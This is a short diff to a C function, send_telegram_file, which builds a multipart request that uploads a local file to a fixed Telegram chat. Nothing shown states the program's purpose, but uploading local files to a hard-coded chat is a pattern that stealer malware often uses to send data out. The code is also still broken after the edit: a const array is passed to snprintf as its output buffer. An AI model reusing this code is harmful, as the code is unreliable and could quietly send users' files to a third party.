@@ -74,10 +74,10 @@ int send_telegram_file(const char* file_path) {
 	}
 	CloseHandle(hFile);
 
-	const char boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+	const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
 
 	const char header[512];
-	snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);
+	snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s\r\n", boundary);
 
 	char request[1024];
 	snprintf(request, sizeof(request), "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", boundary, CHAT_ID, boundary, file_path);
